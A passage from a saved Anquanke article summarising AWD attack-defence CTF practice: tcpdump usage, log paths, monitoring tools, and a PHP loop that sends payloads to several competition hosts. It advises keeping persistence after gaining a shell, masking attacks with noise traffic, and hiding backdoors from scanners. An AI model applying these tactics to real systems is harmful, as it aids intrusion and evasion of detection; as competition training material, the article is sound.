len：|设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断，输出行中会出现”[proto]”的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量，从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。</p>\n<p>输出选项：| 作用 ———|—- -e：|输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。 -q：|快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。 -X：|输出包的头部数据，会以16进制和ASCII两种方式同时输出。 -XX：|输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。 -v：|当分析和打印的时候，产生详细的输出。 -vv：|产生比-v更详细的输出。 -vvv：|产生比-vv更详细的输出。</p>\n<p>其他功能性选项：|作用 —-|—- -D：|列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于”-i”后。 -F：|从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。 -w：|将抓包数据输出到文件中而不是标准输出。可以同时配合”-G time|选项使得输出文件每time秒就自动切换到另一个文件。可通过”-r”选项载入这些文件以进行分析和打印。 -r：|从给定的数据包文件中读取数据。使用”-“表示从标准输入中读取。</p>\n<h4 id=\"h4-u7AEFu53E3u8FC7u6EE4\">\n<a class=\"reference-link\" name=\"%E7%AB%AF%E5%8F%A3%E8%BF%87%E6%BB%A4\"></a>端口过滤</h4>\n<pre><code class=\"lang-text\">抓取所有经过ens33，目的或源端口22的网络数据：\r\ntcpdump -i ens33 port 22\r\n指定源端口：tcpdump -i ens33 sec port 22\r\n指定目的端口: tcpdump -i ens33 dst port 22\r\n</code></pre>\n<h4 id=\"h4-u7F51u7EDCu8FC7u6EE4\">\n<a class=\"reference-link\" name=\"%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4\"></a>网络过滤</h4>\n<pre><code class=\"lang-text\">tcpdump -i ens33 net 192.168.1.1\r\ntcpdump -i ens33 src net 192.168.1.1 #源端口\r\ntcpdump -i ens33 dst net 192.168.1.1 #目的端口\r\n</code></pre>\n<h4 id=\"h4-u534Fu8BAEu8FC7u6EE4\">\n<a class=\"reference-link\" name=\"%E5%8D%8F%E8%AE%AE%E8%BF%87%E6%BB%A4\"></a>协议过滤</h4>\n<pre><code class=\"lang-text\">tcpdump -i ens33 arp\r\ntcpdump -i ens33 ip\r\ntcpdump -i ens33 tcp\r\ntcpdump -i ens33 udp\r\ntcpdump -i ens33 icmp\r\ntcpdump -w 1.pcap #抓所有包保存到1.pcap中然后使用wireshark分析\r\n</code></pre>\n<h3 name=\"h3-21\" id=\"h3-21\">\n<a class=\"reference-link\" name=\"apache2%E6%97%A5%E5%BF%97\"></a>apache2日志</h3>\n<p>/var/log/apache2/</p>\n<p>/usr/local/apache2/logs</p>\n<h3 name=\"h3-22\" id=\"h3-22\">\n<a class=\"reference-link\" name=\"awd%E4%B8%ADlinux%E7%9A%84%E5%91%BD%E4%BB%A4\"></a>awd中linux的命令</h3>\n<pre><code class=\"lang-bash\">- netstat -anptl 查看开放端口\r\n\r\n- ps aux 以用户为主的格式来查看所有进程\r\n\r\n  pa aux | grep tomcat\r\n\r\n  ps -A 显示进程信息\r\n\r\n  ps -u root 显示root进程用户信息\r\n\r\n  ps -ef 显示所有命令，连带命令行\r\n\r\n- kill 终止进程\r\n\r\n  kill -9 pid\r\n\r\n  //kill -15、kill -9的区别\r\n\r\n  执行kill（默认kill -15）命令，执行kill (默认kill-15) 命令，系统会发送一个SIGTERM信号给对应的程序，,大部分程序接收到SIGTERM信号后，会先kill -9命令,系统给对应程序发送的信号是SIGKILL,即exit。exit信号不会被系统阻塞，所以kill -9能顺利杀掉进程\r\n\r\n- vim编辑器\r\n\r\n  命令行模式下\r\n\r\n  /  查找内容\r\n\r\n  ?  查找内容\r\n\r\n  n  重复上一条检索命令\r\n\r\n  N  命令重复上一条检索命令\r\n</code></pre>\n<p> </p>\n<h2 name=\"h2-23\" id=\"h2-23\">两个awd神器</h2>\n<h3 name=\"h3-24\" id=\"h3-24\">\n<a class=\"reference-link\" name=\"AoiAWD\"></a>AoiAWD</h3>\n<p>aoiawd地址：<a href=\"https://github.com/DasSecurity-HatLab/AoiAWD\">https://github.com/DasSecurity-HatLab/AoiAWD</a></p>\n<p>下载好，自己去编译或者找编译好的直接用</p>\n<h4 id=\"h4-u4F7Fu7528\">\n<a class=\"reference-link\" name=\"%E4%BD%BF%E7%94%A8\"></a>使用</h4>\n<p>把刚刚那些文件夹中的生成的文件例如xxx.phar等发送到提供给的靶机上去，然后记得赋予权限，ip是自己电脑ip，端口就是默认8023</p>\n<pre><code># web的流量监控\r\nchmod +x tapeworm.phar\r\n# 进程监控\r\nchmod +x roundworm\r\n# pwn的监控\r\nchmod +x guardian.phar\r\n\r\n./tapeworm.phar -d 目录 -s ip:port\r\n./roundworm  -w 目录 -s ip -p port\r\n./guardian.phar -i 目录 -s ip:port\r\n\r\n\r\n./tapeworm.phar -d /var/www/html -s ip\r\n./roundworm  -w /var/www/html -s ip -p\r\n./guardian.phar -i /var/www/html -s ip\r\n</code></pre>\n<p>本地需要在命令行启动aoiawd</p>\n<p>启动方式：</p>\n<pre><code class=\"lang-bash\">php aoiawd.phar\r\n</code></pre>\n<p><img class=\"alignnone size-full wp-image-245416 aligncenter\" alt=\"\" width=\"1156\" height=\"252\" data-original=\"https://p2.ssl.qhimg.com/t01a5dd02b3671d1f0e.png\"></p>\n<p>web端口1337</p>\n<p><img class=\"alignnone size-full wp-image-245417 aligncenter\" alt=\"\" width=\"1186\" height=\"537\" data-original=\"https://p0.ssl.qhimg.com/t010bfbdbf40e09d0df.png\"></p>\n<p>token就是命令行启动时access token</p>\n<p>成功进入页面</p>\n<p><img class=\"alignnone size-full wp-image-245418 aligncenter\" alt=\"\" width=\"1183\" height=\"547\" data-original=\"https://p3.ssl.qhimg.com/t0136256c22abd9f3fc.png\"></p>\n<p>左侧可以看到各个模块，使用方式非常简单</p>\n<h4 id=\"h4-u6307u5B9Au7AEFu53E3u91CDu653E\">\n<a class=\"reference-link\" name=\"%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E9%87%8D%E6%94%BE\"></a>指定端口重放</h4>\n<p>需要将上边的单个ip的注释掉，下边的这个改ip和端口</p>\n<pre><code class=\"lang-php\">// 批量端口\r\n$ports = [10024, 10021, 10023];\r\n$host1 = \"http://\" . '10.241.180.159';\r\nforeach ($ports as $port) {\r\n    $host = $host1 . ':' . $port;\r\n    echo \"Sending to: {$host}\\n\\n\";\r\n    sendPayload($host);\r\n}\r\nexit;\r\n</code></pre>\n<h3 name=\"h3-25\" id=\"h3-25\">\n<a class=\"reference-link\" name=\"watchbird\"></a>watchbird</h3>\n<p>这是个通防waf，支持流量转发和替换flag</p>\n<p>地址：<a href=\"https://github.com/leohearts/awd-watchbird\">https://github.com/leohearts/awd-watchbird</a></p>\n<p> </p>\n<h2 name=\"h2-26\" id=\"h2-26\">Fix</h2>\n<p>一个大佬总结的漏洞快修思路</p>\n<p><a href=\"https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/\">https://qftm.github.io/2019/08/03/AWD-Bugs-Fix/</a></p>\n<p>最后：</p>\n<p>保持良好的心态，不到最后一刻都有翻盘的可能</p>\n<p>找出漏洞拿到shell，权限维持后，尽量把这个洞给被控机修了，以免被别人拿到shell</p>\n<p>不仅要保证自己能拿到shell，还有保证别人拿不到shell</p>\n<p>拿shell前先打一波流量，混淆视听</p>\n<p>保证自己的网站上没有d盾可以扫出来的后门</p>\n<p>提高python脚本编写能力</p>\n<p> </p>\n<h2 name=\"h2-27\" id=\"h2-27\">优秀文章</h2>\n<p><a href=\"https://www.anquanke.com/post/id/84675\">《CTF线下赛AWD模式下的生存技巧》</a></p>\n<p><a href=\"http://www.freebuf.com/articles/web/118149.html\">《论如何在CTF比赛中搅“shi”》</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/86984\">《CTF线下防御战 — 让你的靶机变成“铜墙铁壁”》</a></p>\n<p><a href=\"https://github.com/Ares-X/AWD-Predator-Framework\">AWD攻防赛webshell批量利用框架</a></p>\n<p><a href=\"https://github.com/wupco/weblogger\">针对ctf线下赛流量抓取(php)、真实环境流量抓取分析的工具</a></p>\n<p><a href=\"https://github.com/admintony/Prepare-for-AWD\">AWD攻防赛脚本集合</a></p>\n<p><a href=\"https://github.com/ssooking/CTFDefense\">CTFDefense</a></p>\n</body>\n</html>","index":[{"title":"一般流程","id":"#h2-0","sub":[{"title":"1.登录比赛平台，查看比赛信息","id":"#h3-1"},{"title":"2.dump源码","id":"#h3-2"},{"title":"3.站点防御部署","id":"#h3-3"},{"title":"4.利用漏洞进行得分","id":"#h3-4"},{"title":"5.编写脚本批量拿分","id":"#h3-5"}]},{"title":"攻击","id":"#h2-6","sub":[{"title":"服务发现","id":"#h3-7"},{"title":"漏洞利用","id":"#h3-8"},{"title":"权限维持","id":"#h3-9"},{"title":"批量脚本","id":"#h3-10"}]},{"title":"防御","id":"#h2-11","sub":[{"title":"实用命令","id":"#h3-12"},{"title":"部署waf","id":"#h3-13"},{"title":"克制不死马","id":"#h3-14"},{"title":"干掉反弹shell","id":"#h3-15"},{"title":"改密码","id":"#h3-16"},{"title":"文件监控","id":"#h3-17"},{"title":"常用linux命令","id":"#h3-18"},{"title":"流量监控","id":"#h3-19"},{"title":"wireshark","id":"#h3-20"},{"title":"apache2日志","id":"#h3-21"},{"title":"awd中linux的命令","id":"#h3-22"}]},{"title":"两个awd神器","id":"#h2-23","sub":[{"title":"AoiAWD","id":"#h3-24"},{"title":"watchbird","id":"#h3-25"}]},{"title":"Fix","id":"#h2-26","sub":[]},{"title":"优秀文章","id":"#h2-27","sub":[]}],"success":true},"share":{"title":"国赛分区赛awd赛后总结-安心做awd混子","desc":"最近参加了国赛分区赛，我所在的分区正好是awd赛制，所以总结了下关于awd的基操，方便新手入门。","imgUrl":"https://p5.ssl.qhimg.com/sdm/160_160_100/t014b09264c422ce958.jpg"},"author":{"nickname":"Ocean","user_url":"","id":150005,"avatar":"https://p0.ssl.qhimg.com/t018554a95f0f0a50be.png","banner":"https://p3.ssl.qhimg.com/t014757b72460d855bf.png","location":"","user_label":"","description":"知其黑，守其白，博客地址：oceansec.blog.csdn.net","register_date":"2020-07-20 17:37:10","self":false,"follow":false,"post_count":2,"follower_count":3,"follow_count":7,"comment_count":9},"relevant":[{"id":288353,"title":"培养云上安全人才 | 阿里云2023首届CTF大赛重磅启动","date":"2023-04-24 19:17:46"},{"id":286967,"title":"Ichunqiu云境 —— Exchange Writeup","date":"2023-03-03 14:30:36"},{"id":284201,"title":"Ichunqiu云境 - Delegation Writeup","date":"2023-01-06 10:30:50"},{"id":284260,"title":"Ichunqiu云境 —— Tsclient Writeup","date":"2023-01-05 10:30:31"},{"id":284307,"title":"活动 | 长亭科技2023第五届 Real World CTF 战火已燃，等你来战！","date":"2022-12-21 17:00:34"},{"id":283073,"title":"从一道题入门 UEFI PWN","date":"2022-11-11 15:30:05"},{"id":282335,"title":"2022年工业信息安全技能大赛“望岳杯”锦标赛 wp","date":"2022-10-31 15:30:36"}],"authorPostList":[{"post_id":259244,"title":"对着登录框一顿暴捶","cover":"https://p4.ssl.qhimg.com/sdm/229_160_100/t016de0dfc78234e1b2.png","date":"2021-11-23 15:30:53"},{"post_id":245158,"title":"国赛分区赛awd赛后总结-安心做awd混子","cover":"https://p5.ssl.qhimg.com/sdm/229_160_100/t014b09264c422ce958.jpg","date":"2021-06-30 10:00:01"}],"cookie":{"__guid":"213549842.2010739486156183000.1685757824050.7908","__DC_sid":"213549842.2304340555566067000.1687534478048.9534","PHPSESSID":"ivu5516uboqikg3d6596lp3ui1","__DC_monitor_count":"2","__DC_gid":"213549842.902862346.1685757824050.1687534788867.18"}}};
//published at: 6/23/2023, 3:45:43 PM</script>

<script src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/a89b1e55fab19834,969b9d2ab6d58ff9.js.下载"></script>
<script src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/e855bc476c0070c4,d70645fabcfd28e5,b00f894d26352cfe,374cd4f654903275,1fbf0cc911f15a9c.js.下载"></script>
<script src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/43c736269a19e5f8,d7c4492c306d9e12.js.下载"></script>
<script src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/c3f64e723fc684b2,d29a864a4b5dd4b6,5c4b8b1bbe75533d,f59329488ebbc180,569b6657398e046f,50a9d6f78d7b9c2b,ffa01aa1dfa9875c,1e0c54ddfbe618cb,cc52ec6e18fb5e0f,7e2ef3c63800d75a,163f062eddf12afb,12d46f82993.下载"></script><div id="js-toast" data-v-app=""></div><!----><div id="js-lift" data-v-app=""></div><div class="_15"></div>


</body></html>